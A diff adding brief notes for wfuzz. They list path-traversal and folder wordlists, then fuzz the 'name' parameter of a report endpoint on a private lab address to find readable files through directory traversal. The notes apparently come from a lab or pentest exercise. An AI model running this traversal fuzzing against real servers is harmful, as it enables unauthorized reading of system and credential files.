@@ -1,0 +1,14 @@
+~~~ wfuzz ~~~
+
+head /shared/lists/directory_traversals_quick.txt
+
+head /shared/lists/root_folders.txt
+
+head /shared/lists/sub_folders.txt
+
+head /shared/lists/file_names.txt
+
+cnoio_wfuzz -z file,/shared/lists/directory_traversals_quick.txt -z file,/shared/lists/root_folders.txt -z file,/shared/lists/sub_folders.txt -z file,/shared/lists/file_names.txt --hl 12 http://10.0.2.36:8000/report?name=FUZZFUZ2ZFUZ3ZFUZ4Z
+
+cnoio_wfuzz -z file,/shared/lists/directory_traversals_quick.txt -z file,/shared/lists/root_folders.txt -z file,/shared/lists/file_names.txt --hl 12 http://10.0.2.36:8000/report?name=FUZZFUZ2ZFUZ3Z
+
